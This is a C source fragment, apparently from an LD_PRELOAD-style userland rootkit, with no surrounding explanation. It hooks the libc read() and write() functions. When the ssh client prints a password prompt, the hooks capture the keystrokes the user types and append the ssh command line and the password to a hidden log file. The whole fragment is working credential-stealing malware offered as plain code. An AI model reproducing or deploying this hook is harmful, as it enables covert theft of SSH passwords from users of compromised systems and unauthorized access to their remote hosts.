ssize_t read(int fd, void *buf, size_t nbyte){
    hook(o_read,"read");
    ssize_t ret=o_read(fd,buf,nbyte);
    char *p;
    FILE *fp;

    if(!strcmp("ssh",cprocname()) && fd==4 && ssh_start){
        p=buf;
        if(*p=='\n'){
            ssh_start=0;
            hook(o_fopen,"fopen");
            fp=o_fopen(SSH_LOGS,"a");
            if(!fp) return ret;
            fprintf(fp, "%s (%s)\n", gcmdline(), ssh_pass);
            fflush(fp);
            fclose(fp);
            return ret;
        }
        ssh_pass[ssh_pass_size++] = *p;
    }
    return ret;
}
ssize_t write(int fd, const void *buf, size_t nbyte){
    hook(o_write,"write");
    int ret;
    if(!strcmp("ssh",cprocname()) && strstr(buf,"assword")){
        ssh_pass_size=0;
        memset(ssh_pass,0,sizeof(ssh_pass));
        ssh_start=1;
    }
    ret=o_write(fd,buf,nbyte);
    return ret;
}